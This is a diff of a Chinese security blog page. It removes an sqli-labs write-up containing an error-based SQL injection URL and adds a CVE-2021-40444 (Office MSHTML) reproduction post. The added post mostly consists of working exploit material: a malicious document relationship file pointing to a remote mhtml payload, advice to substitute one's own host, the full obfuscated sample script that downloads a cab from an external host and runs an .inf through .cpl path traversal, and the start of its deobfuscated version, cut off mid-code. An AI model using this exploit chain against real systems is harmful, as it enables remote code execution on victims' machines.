@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>sqli labs Less 50 -&gt; Less 54 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="sqli labs Less 50 -&gt; Less 54 | 九世的博客">
+  <title>CVE-2021-40444漏洞复现 | 九世的博客</title>
+  <meta name="keywords" content=" 漏洞复现 ">
+  <meta name="description" content="CVE-2021-40444漏洞复现 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="友链BGM:拔剑神曲   即刻安全 Hacking 木头的博客 hackhat社区 Xhong的博客">
 <meta property="og:type" content="website">
@@ -1884,9 +1884,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-sqli-labs-Less-50-Less-54" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-CVE-2021-40444漏洞复现" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">sqli labs Less 50 -&gt; Less 54</h1>
+        <h1 class="article-title">CVE-2021-40444漏洞复现</h1>
     
     <div class="article-meta">
         
@@ -1895,14 +1895,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color5">漏洞复现</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2019-02-14 18:37</time>
+        创建时间:<time class="date" title="更新时间: 2021-09-13 16:46:05">2021-09-13 16:25</time>
         
     </div>
     <div class="article-meta">
@@ -1924,7 +1924,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#测试环境"><span class="toc-text">测试环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞成因"><span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复现过程"><span class="toc-text">复现过程</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1939,559 +1939,120 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr>
-<p>距离上学还有3天，今天继续闯sqli-labs靶场，从50关崩到54关，感觉可还行<br><img src="http://i0.hdslb.com/bfs/archive/5e52287fe186c4bb6a714985fb0ef5a4625558ff.jpg" alt="5e52287fe186c4bb6a714985fb0ef5a4625558ff.jpg"><br><b>BGM:喜欢</b></p>
-<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=526464145&auto=1&height=66"></iframe>
-
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><hr>
-<p>50关代码</p>
-<pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
-&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
-&lt;title&gt;ORDER BY Clause Blind based&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body bgcolor=&quot;#000000&quot;&gt;
-&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
-&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;
-
-&lt;?php
-include(&quot;../sql-connections/sqli-connect.php&quot;);
-error_reporting(0);
-$id=$_GET[&#39;sort&#39;];    
-if(isset($id))
-{
-    //logging the connection parameters to a file for analysis.
-    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
-    fwrite($fp,&#39;SORT:&#39;.$id.&quot;\n&quot;);
-    fclose($fp);
-
-    $sql=&quot;SELECT * FROM users ORDER BY $id&quot;;
-    /* execute multi query */
-    if (mysqli_multi_query($con1, $sql))
-    {
-
-        ?&gt;
-        &lt;center&gt;
-        &lt;font color= &quot;#00FF00&quot; size=&quot;4&quot;&gt;
-
-        &lt;table   border=1&#39;&gt;
-        &lt;tr&gt;
-            &lt;th&gt;&amp;nbsp;ID&amp;nbsp;&lt;/th&gt;
-            &lt;th&gt;&amp;nbsp;USERNAME&amp;nbsp;  &lt;/th&gt;
-            &lt;th&gt;&amp;nbsp;PASSWORD&amp;nbsp;  &lt;/th&gt;
-        &lt;/tr&gt;
-        &lt;/font&gt;
-        &lt;/font&gt;
-        &lt;?php
-            /* store first result set */
-            if ($result = mysqli_store_result($con1))
-            {
-                while($row = mysqli_fetch_row($result))
-                {
-                    echo &#39;&lt;font color= &quot;#00FF11&quot; size=&quot;3&quot;&gt;&#39;;        
-                    echo &quot;&lt;tr&gt;&quot;;
-                    echo &quot;&lt;td&gt;&quot;;
-                    printf(&quot;%s&quot;, $row[0]);
-                    echo &quot;&lt;/td&gt;&quot;;
-                    echo &quot;&lt;td&gt;&quot;;
-                    printf(&quot;%s&quot;, $row[1]);
-                    echo &quot;&lt;/td&gt;&quot;;
-                    echo &quot;&lt;td&gt;&quot;;
-                    printf(&quot;%s&quot;, $row[2]);
-                    echo &quot;&lt;/td&gt;&quot;;
-                    echo &quot;&lt;/tr&gt;&quot;;
-                    echo &quot;&lt;/font&gt;&quot;;
-
+        <h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>office 2016<br>windows 10 ver:1909</p>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>和十年前的IE网马一样，IE自动安装新的插件导致该漏洞，以及office可以引用mshtml格式，导致排版引擎模板可执行</p>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>（安了office 2016才有的CLSID，office 2010并没有）<br>这个漏洞是利用ie的COM口实现的。CLSID:edbc374c-5730-432a-b5b8-de94f0b57217<br><img src="https://z3.ax1x.com/2021/09/13/4PcrSH.png" alt=""></p>
+<p>安了office 2010的win7<br><img src="https://z3.ax1x.com/2021/09/13/4Pcgmt.png" alt=""></p>
+<p>原样本地址：<a href="https://app.any.run/tasks/36c14029-9df8-439c-bba0-45f2643b0c70/#" target="_blank" rel="noopener">https://app.any.run/tasks/36c14029-9df8-439c-bba0-45f2643b0c70/#</a><br>修改word/_rels/document.xml，将hdusi.com改为自己的IP</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;
+&lt;Relationships xmlns=&quot;http://schemas.openxmlformats.org/package/2006/relationships&quot;&gt;&lt;Relationship Id=&quot;rId8&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme&quot; Target=&quot;theme/theme1.xml&quot;/&gt;&lt;Relationship Id=&quot;rId3&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings&quot; Target=&quot;webSettings.xml&quot;/&gt;&lt;Relationship Id=&quot;rId7&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable&quot; Target=&quot;fontTable.xml&quot;/&gt;&lt;Relationship Id=&quot;rId2&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings&quot; Target=&quot;settings.xml&quot;/&gt;&lt;Relationship Id=&quot;rId1&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles&quot; Target=&quot;styles.xml&quot;/&gt;&lt;Relationship Id=&quot;rId6&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject&quot; Target=&quot;mhtml:http://3079-183-6-55-142.ngrok.io/word.html!x-usc:http://3079-183-6-55-142.ngrok.io/word.html&quot; TargetMode=&quot;External&quot;/&gt;&lt;Relationship Id=&quot;rId5&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image&quot; Target=&quot;media/image2.wmf&quot;/&gt;&lt;Relationship Id=&quot;rId4&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image&quot; Target=&quot;media/image1.jpeg&quot;/&gt;&lt;/Relationships&gt;
+</code></pre><p>或者直接用已经公开的exp生成：<a href="https://github.com/lockedbyte/CVE-2021-40444" target="_blank" rel="noopener">https://github.com/lockedbyte/CVE-2021-40444</a><br>效果如下<br><img src="https://z3.ax1x.com/2021/09/13/4PcL7V.jpg" alt=""><br><img src="https://z3.ax1x.com/2021/09/13/4PgS1J.jpg" alt=""></p>
+<p>触发漏洞主要是word.html里的js和原版混淆的一样，只是改了远程请求链接</p>
+<pre><code class="javascrript">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta http-equiv=&quot;Expires&quot; content=&quot;-1&quot;&gt;        &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=11&quot;&gt;    &lt;/head&gt;    &lt;body&gt;&lt;!-- 这段js利用[]进行函数执行     --&gt;&lt;!-- 重复的垃圾代码 --&gt;        &lt;script&gt;            var a0_0x127f = [&#39;123&#39;, &#39;365952KMsRQT&#39;, &#39;tiveX&#39;, &#39;/Lo&#39;, &#39;./../../&#39;, &#39;contentDocument&#39;, &#39;ppD&#39;, &#39;Dat&#39;, &#39;close&#39;, &#39;Acti&#39;, &#39;removeChild&#39;, &#39;mlF&#39;, &#39;write&#39;, &#39;./A&#39;, &#39;ata/&#39;, &#39;ile&#39;, &#39;../&#39;, &#39;body&#39;, &#39;setAttribute&#39;, &#39;#version=5,0,0,0&#39;, &#39;ssi&#39;, &#39;iframe&#39;, &#39;748708rfmUTk&#39;, &#39;documentElement&#39;, &#39;lFile&#39;, &#39;location&#39;, &#39;159708hBVRtu&#39;, &#39;a/Lo&#39;, &#39;Script&#39;, &#39;document&#39;, &#39;call&#39;, &#39;contentWindow&#39;, &#39;emp&#39;, &#39;Document&#39;, &#39;Obj&#39;, &#39;prototype&#39;, &#39;lfi&#39;, &#39;bject&#39;, &#39;send&#39;, &#39;appendChild&#39;, &#39;Low/championship.inf&#39;, &#39;htmlfile&#39;, &#39;115924pLbIpw&#39;, &#39;GET&#39;, &#39;p/championship.inf&#39;, &#39;1109sMoXXX&#39;, &#39;./../A&#39;, &#39;htm&#39;, &#39;l/T&#39;, &#39;cal/&#39;, &#39;1wzQpCO&#39;, &#39;ect&#39;, &#39;w/championship.inf&#39;, &#39;522415dmiRUA&#39;, &#39;http://hidusi.com/e8c76295a5f9acb7/ministry.cab&#39;, &#39;88320wWglcB&#39;, &#39;XMLHttpRequest&#39;, &#39;championship.inf&#39;, &#39;Act&#39;, &#39;D:edbc374c-5730-432a-b5b8-de94f0b57217&#39;, &#39;open&#39;, &#39;&lt;bo&#39;, &#39;HTMLElement&#39;, &#39;/..&#39;, &#39;veXO&#39;, &#39;102FePAWC&#39;];            function a0_0x15ec(_0x329dba, _0x46107c) {                return a0_0x15ec = function(_0x127f75, _0x15ecd5) {                    _0x127f75 = _0x127f75 - 0xaa;                    var _0x5a770c = a0_0x127f[_0x127f75];                    return _0x5a770c;                }                ,                a0_0x15ec(_0x329dba, _0x46107c); //a0_0x15ec函数主要调用返回            }            (function(_0x59985d, _0x17bed8) { //_0x59985d -&gt; a0_0x127f                var _0x1eac90 = a0_0x15ec;                while (!![]) {                    try {                        var _0x2f7e2d = parseInt(_0x1eac90(0xce)) + parseInt(_0x1eac90(0xd8)) * parseInt(_0x1eac90(0xc4)) + parseInt(_0x1eac90(0xc9)) * -parseInt(_0x1eac90(0xad)) + parseInt(_0x1eac90(0xb1)) + parseInt(_0x1eac90(0xcc)) + -parseInt(_0x1eac90(0xc1)) + parseInt(_0x1eac90(0xda));                        if (_0x2f7e2d === _0x17bed8) //判断两者数值是否等于384881，如果相等则break                            break;                        else                            _0x59985d[&#39;push&#39;](_0x59985d[&#39;shift&#39;]()); //将a0_0x127f数组首位元素移动到数组尾部                    } catch (_0x34af1e) {                        _0x59985d[&#39;push&#39;](_0x59985d[&#39;shift&#39;]());                    }                }            }(a0_0x127f, 0x5df71), //数组元素移动到尾部的算法            function() {                var _0x2ee207 = a0_0x15ec                  , _0x279eab = window                  , _0x1b93d7 = _0x279eab[_0x2ee207(0xb4)] //调用的a0_0x15ec函数 -&gt; window.document                  , _0xcf5a2 = _0x279eab[_0x2ee207(0xb8)][&#39;prototype&#39;][&#39;createElement&#39;] // -&gt; Document.prototype.createElement                  , _0x4d7c02 = _0x279eab[_0x2ee207(0xb8)][&#39;prototype&#39;][_0x2ee207(0xe5)] // -&gt; Document.prototype.write                  , _0x1ee31c = _0x279eab[_0x2ee207(0xd5)][_0x2ee207(0xba)][_0x2ee207(0xbe)] // -&gt; HTMLElement.prototype.appendChild                  , _0x2d20cd = _0x279eab[_0x2ee207(0xd5)][_0x2ee207(0xba)][_0x2ee207(0xe3)] // -&gt; HTMLElement.prototype.removeChild                  , _0x4ff114 = _0xcf5a2[&#39;call&#39;](_0x1b93d7, _0x2ee207(0xac)); // -&gt; Document.prototype.createElement.call(window.document,&quot;iframe&quot;) -&gt; &lt;new iframe&gt;                try {                    _0x1ee31c[_0x2ee207(0xb5)](_0x1b93d7[_0x2ee207(0xea)], _0x4ff114); // -&gt; HTMLElement.prototype.appendChild.call(window.document.body,&lt;new iframe&gt;) //添加iframe标签                } catch (_0x1ab454) {                    _0x1ee31c[_0x2ee207(0xb5)](_0x1b93d7[_0x2ee207(0xae)], _0x4ff114);                }                var _0x403e5f = _0x4ff114[_0x2ee207(0xb6)][&#39;ActiveXObject&#39;] // -&gt; &lt;new iframe&gt;.contentWindow.ActiveXObject                  , _0x224f7d = new _0x403e5f(_0x2ee207(0xc6) + _0x2ee207(0xbb) + &#39;le&#39;); // -&gt; new _0x403e5f(&#39;htmlfile&#39;) -&gt; new ActiveXObject(&#39;htmlfijle&#39;)                _0x4ff114[_0x2ee207(0xde)][&#39;open&#39;]()[_0x2ee207(0xe1)](); // -&gt; &lt;new iframe&gt;.contentDocument.open().close()                var _0x371a71 = &#39;p&#39;;                try {                    _0x2d20cd[_0x2ee207(0xb5)](_0x1b93d7[_0x2ee207(0xea)], _0x4ff114); // -&gt; HTMLElement.prototype.removeChild.call(window.document.body,&lt;new iframe&gt;)                } catch (_0x3b004e) {                    _0x2d20cd[&#39;call&#39;](_0x1b93d7[&#39;documentElement&#39;], _0x4ff114);                }                function _0x2511dc() {                    var _0x45ae57 = _0x2ee207;                    return _0x45ae57(0xcd);                }                _0x224f7d[&#39;open&#39;]()[_0x2ee207(0xe1)](); // -&gt; _0x224f7d.open().close()  -&gt; new ActiveXObject(&#39;htmlfijle&#39;).open().close()                var _0x3e172f = new _0x224f7d[(_0x2ee207(0xb3))][(_0x2ee207(0xd1)) + &#39;iveX&#39; + (_0x2ee207(0xb9)) + (_0x2ee207(0xca))](&#39;htm&#39; + _0x2ee207(0xaf)); // -&gt; new _0x224f7d.Script.ActiveXObject(&#39;htmlFile&#39;) -&gt; new ActiveXObject(&#39;htmlfijle&#39;).Script.ActiveXObject(&#39;htmlFile&#39;)                _0x3e172f[_0x2ee207(0xd3)]()[_0x2ee207(0xe1)](); // -&gt; _0x3e172f.open().close()                var _0xd7e33d = &#39;c&#39;                  , _0x35b0d4 = new _0x3e172f[(_0x2ee207(0xb3))][&#39;Ac&#39; + (_0x2ee207(0xdb)) + &#39;Ob&#39; + &#39;ject&#39;](&#39;ht&#39; + _0x2ee207(0xe4) + _0x2ee207(0xe8)); // -&gt; new _0x3e172f.Script.ActiveXObject(&#39;htmlFile&#39;)                _0x35b0d4[_0x2ee207(0xd3)]()[_0x2ee207(0xe1)](); // -&gt; _0x35b0d4.open().close()                var _0xf70c6e = new _0x35b0d4[&#39;Script&#39;][(_0x2ee207(0xe2)) + (_0x2ee207(0xd7)) + (_0x2ee207(0xbc))](&#39;ht&#39; + &#39;mlF&#39; + _0x2ee207(0xe8));                _0xf70c6e[_0x2ee207(0xd3)]()[_0x2ee207(0xe1)](); // -&gt; new _0x35b0d4.Script.ActiveXObject(&#39;htmlFile&#39;)                var _0xfed1ef = new ActiveXObject(&#39;htmlfile&#39;)                  , _0x5f3191 = new ActiveXObject(_0x2ee207(0xc0)) // new ActiveXObject(&#39;htmlFile&#39;)                  , _0xafc795 = new ActiveXObject(_0x2ee207(0xc0))                  , _0x5a6d4b = new ActiveXObject(&#39;htmlfile&#39;)                  , _0x258443 = new ActiveXObject(&#39;htmlfile&#39;)                  , _0x53c2ab = new ActiveXObject(&#39;htmlfile&#39;)                  , _0x3a627b = _0x279eab[_0x2ee207(0xcf)] //window.XMLHttpRequest                  , _0x2c84a8 = new _0x3a627b() // new window.XMLHttpRequest()                  , _0x220eee = _0x3a627b[_0x2ee207(0xba)][_0x2ee207(0xd3)] //&lt;XMLHttpRequest&gt;.prototype.open                  , _0x3637d8 = _0x3a627b[_0x2ee207(0xba)][_0x2ee207(0xbd)] //&lt;XMLHttpRequest&gt;.prototype.send                  , _0x27de6f = _0x279eab[&#39;setTimeout&#39;]; //window.XMLHttpRequest.setTimeout                _0x220eee[_0x2ee207(0xb5)](_0x2c84a8, _0x2ee207(0xc2), _0x2511dc(), ![]), //&lt;XMLHttpRequest&gt;.prototype.open.call(&lt;XMLHttpRequest&gt;,&#39;GET&#39;,&#39;http://hidusi.com/e8c76295a5f9acb7/ministry.cab&#39;,![])                _0x3637d8[_0x2ee207(0xb5)](_0x2c84a8),//&lt;XMLHttpRequest&gt;.prototype.send.call(&lt;XMLHttpRequest&gt;,)                _0xf70c6e[_0x2ee207(0xb3)][_0x2ee207(0xb4)][_0x2ee207(0xe5)](_0x2ee207(0xd4) + &#39;dy&gt;&#39;); //_0xf70c6e.Script.document.write(&#39;&lt;body&gt;&#39;)                var _0x126e83 = _0xcf5a2[_0x2ee207(0xb5)](_0xf70c6e[&#39;Script&#39;][_0x2ee207(0xb4)], &#39;ob&#39; + &#39;je&#39; + &#39;ct&#39;); //Document.prototype.createElement.call(_0xf70c6e.Script.document,&#39;object&#39;)                _0x126e83[_0x2ee207(0xeb)](&#39;co&#39; + &#39;de&#39; + &#39;ba&#39; + &#39;se&#39;, _0x2511dc() + _0x2ee207(0xaa)); //_0x126e83.setAttribute(codebase,&#39;http://hidusi.com/e8c76295a5f9acb7/ministry.cab#version=5,0,0,0&#39;)                var _0x487bfa = &#39;l&#39;;                _0x126e83[_0x2ee207(0xeb)](&#39;c&#39; + &#39;la&#39; + _0x2ee207(0xab) + &#39;d&#39;, &#39;CL&#39; + &#39;SI&#39; + _0x2ee207(0xd2)), //_0x126e83.setAttribute(&#39;CLSID:edbc374c-5730-432a-b5b8-de94f0b57217&#39;)                _0x1ee31c[_0x2ee207(0xb5)](_0xf70c6e[_0x2ee207(0xb3)][&#39;document&#39;][&#39;body&#39;], _0x126e83), //HTMLElement.prototype.appendChild.call(_0xf70c6e.Script.document.body,_0x126e83)                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;123&#39;,                &lt;!-- 重复垃圾代码分割线 --&gt;                //_0xfed1ef.Script.location=&#39;.cpl:123&#39;                _0xfed1ef[_0x2ee207(0xb3)][&#39;location&#39;] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xd9),                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xd9),                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xd9),                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;123&#39;,                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xd9),                _0xfed1ef[&#39;Script&#39;][&#39;location&#39;] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xd9),                _0xfed1ef[_0x2ee207(0xb3)][&#39;location&#39;] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xd9),                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;123&#39;,                &lt;!-- 重复垃圾代码分割线 --&gt;                _0xfed1ef[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;..&#39; + &#39;/.&#39; + _0x2ee207(0xc5) + _0x2ee207(0xdf) + _0x2ee207(0xe7) + &#39;Lo&#39; + _0x2ee207(0xc8) + &#39;T&#39; + _0x2ee207(0xb7) + _0x2ee207(0xdc) + _0x2ee207(0xcb)                &lt;!-- 重复垃圾代码分割线2 --&gt;                //_0xfed1ef.Script.location==&#39;.cpl:../../../AppData/Local/Temp/Low/championship.inf&#39;,                _0x5f3191[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:.&#39; + &#39;./&#39; + &#39;..&#39; + &#39;/.&#39; + _0x2ee207(0xe6) + &#39;pp&#39; + _0x2ee207(0xe0) + &#39;a/Lo&#39; + &#39;ca&#39; + _0x2ee207(0xc7) + &#39;em&#39; + &#39;p/championship.inf&#39;,                _0xafc795[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;..&#39; + _0x2ee207(0xd6) + &#39;/.&#39; + &#39;./../A&#39; + _0x2ee207(0xdf) + _0x2ee207(0xe7) + &#39;Lo&#39; + _0x2ee207(0xc8) + &#39;T&#39; + _0x2ee207(0xb7) + _0x2ee207(0xdc) + &#39;w/championship.inf&#39;,                _0x5a6d4b[_0x2ee207(0xb3)][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:.&#39; + &#39;./&#39; + _0x2ee207(0xe9) + &#39;..&#39; + &#39;/.&#39; + _0x2ee207(0xe6) + &#39;pp&#39; + &#39;Dat&#39; + _0x2ee207(0xb2) + &#39;ca&#39; + &#39;l/T&#39; + &#39;em&#39; + _0x2ee207(0xc3),                _0x258443[_0x2ee207(0xb3)][&#39;location&#39;] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;..&#39; + _0x2ee207(0xd6) + &#39;/.&#39; + _0x2ee207(0xdd) + &#39;T&#39; + _0x2ee207(0xb7) + _0x2ee207(0xdc) + _0x2ee207(0xcb),                _0x5a6d4b[&#39;Script&#39;][_0x2ee207(0xb0)] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:.&#39; + &#39;./&#39; + &#39;../&#39; + &#39;..&#39; + &#39;/.&#39; + &#39;./../T&#39; + &#39;em&#39; + &#39;p/championship.inf&#39;,                _0x5a6d4b[_0x2ee207(0xb3)][&#39;location&#39;] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + _0x2ee207(0xe9) + _0x2ee207(0xe9) + _0x2ee207(0xbf),                _0x5a6d4b[_0x2ee207(0xb3)][&#39;location&#39;] = &#39;.&#39; + _0xd7e33d + _0x371a71 + _0x487bfa + &#39;:&#39; + &#39;../&#39; + _0x2ee207(0xe9) + _0x2ee207(0xd0);                &lt;!-- 重复垃圾代码分割线2 --&gt;            }());        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;
+</code></pre>
+<p>公开POC里的deob.html为作者解密混淆后写的</p>
+<pre><code class="javascrript">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;meta http-equiv=&quot;Expires&quot; content=&quot;-1&quot;&gt;
+        &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=11&quot;&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;script&gt;
+            function garbage() {
+                return &#39;garbage&#39;;
+            }
+            (function exploit() {
+                var iframe = window[&quot;Document&quot;][&#39;prototype&#39;][&#39;createElement&#39;][&#39;call&#39;](window[&quot;document&quot;], &#39;iframe&#39;); //创建一个iframe标签的object
+                try {
+                    window[&quot;HTMLElement&quot;][&quot;prototype&quot;][&quot;appendChild&quot;][&#39;call&#39;](window[&quot;document&quot;][&#39;body&#39;], iframe); //当前body内容里添加iframe标签
+                } catch (_0x1ab454) {
+                    window[&quot;HTMLElement&quot;][&quot;prototype&quot;][&quot;appendChild&quot;][&#39;call&#39;](window[&quot;document&quot;][&#39;documentElement&#39;], iframe);
                 }
-
-            }
-    echo &quot;&lt;/table&gt;&quot;;
-    }
-
-    else
-    {
-        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
-        print_r(mysqli_error($con1));
-        echo &quot;&lt;/font&gt;&quot;;  
-    }
-}
-else
-{
-    echo &quot;Please input parameter as SORT with numeric value&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-    echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-    echo &#39;&lt;img src=&quot;../images/Less-50.jpg&quot; /&gt;&lt;br&gt;&#39;;    
-}
-?&gt;
-&lt;/font&gt; 
-&lt;/div&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-
-&lt;/center&gt; 
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<p>还是order by注入，报错注入带走</p>
-<pre><code>http://127.0.0.1/sqli-labs-master/Less-50/?sort=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)
-</code></pre><p><img src="https://s2.ax1x.com/2019/02/14/kBzIXD.md.png" alt="kBzIXD.md.png"></p>
-<p>51关代码：</p>
-<pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
-&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
-&lt;title&gt;ORDER BY Clause Blind based&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body bgcolor=&quot;#000000&quot;&gt;
-&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
-&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;
-
-&lt;?php
-include(&quot;../sql-connections/sqli-connect.php&quot;);
-error_reporting(0);
-$id=$_GET[&#39;sort&#39;];    
-if(isset($id))
-{
-    //logging the connection parameters to a file for analysis.
-    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
-    fwrite($fp,&#39;SORT:&#39;.$id.&quot;\n&quot;);
-    fclose($fp);
-
-    $sql=&quot;SELECT * FROM users ORDER BY &#39;$id&#39;&quot;;
-    /* execute multi query */
-    if (mysqli_multi_query($con1, $sql)) 
-    {
-
-        ?&gt;
-        &lt;center&gt;
-        &lt;font color= &quot;#00FF00&quot; size=&quot;4&quot;&gt;
-
-        &lt;table   border=1&#39;&gt;
-        &lt;tr&gt;
-            &lt;th&gt;&amp;nbsp;ID&amp;nbsp;&lt;/th&gt;
-            &lt;th&gt;&amp;nbsp;USERNAME&amp;nbsp;  &lt;/th&gt;
-            &lt;th&gt;&amp;nbsp;PASSWORD&amp;nbsp;  &lt;/th&gt;
-        &lt;/tr&gt;
-        &lt;/font&gt;
-        &lt;/font&gt;
-        &lt;?php
-            /* store first result set */
-            if ($result = mysqli_store_result($con1))
-            {
-                while($row = mysqli_fetch_row($result))
-                {
-                    echo &#39;&lt;font color= &quot;#00FF11&quot; size=&quot;3&quot;&gt;&#39;;        
-                    echo &quot;&lt;tr&gt;&quot;;
-                    echo &quot;&lt;td&gt;&quot;;
-                    printf(&quot;%s&quot;, $row[0]);
-                    echo &quot;&lt;/td&gt;&quot;;
-                    echo &quot;&lt;td&gt;&quot;;
-                    printf(&quot;%s&quot;, $row[1]);
-                    echo &quot;&lt;/td&gt;&quot;;
-                    echo &quot;&lt;td&gt;&quot;;
-                    printf(&quot;%s&quot;, $row[2]);
-                    echo &quot;&lt;/td&gt;&quot;;
-                    echo &quot;&lt;/tr&gt;&quot;;
-                    echo &quot;&lt;/font&gt;&quot;;
-
+                var htmlfile = iframe[&#39;contentWindow&#39;][&#39;ActiveXObject&#39;] //实例化ActiveXObject
+                  , htmlfile2 = new htmlfile(&#39;htmlfile&#39;); //htmlfile就是一个COM版的DOM，也就是说，htmlfile是个ActiveX版的 window.document
